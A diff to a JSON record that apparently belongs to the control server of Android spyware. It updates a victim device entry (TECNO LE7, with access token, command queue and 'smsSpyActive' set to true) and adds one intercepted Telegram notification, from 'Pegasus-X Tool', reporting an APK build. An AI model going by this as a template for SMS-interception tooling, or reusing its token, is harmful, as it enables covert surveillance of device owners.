@@ -68,7 +68,7 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "2b39a6703f5db8211dfa9f9423390eb5",
-    "lastSeen": 1776622275204,
+    "lastSeen": 1776622287215,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-19T17:08:10.865Z",
@@ -84,6 +84,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Pegasus-X Tool",
+        "content": "✅ Actions Success\n\n▢ Information\n└──\n ├── workflow : Build PSKNMRC\n ├── repo     : a-up3\n ├── branch   : main\n ├── commit   : 9e29428\n ├── duration : 6m 4s\n └── result   : Success\n\n▢ Artifact\n└──\n ├── name : AIMLOCK-APK\n └── size : 37.35 MB\n\n❌ Gagal Download: ETELEGRAM: 400 Bad Request: invalid file HTTP URL specified: URL host is empty\nDownload Manual Via Link.",
+        "time": "20/04 01:11",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776622289615
+      },
       {
         "appName": "Telegram",
         "sender": "Pegasus-X Tool",
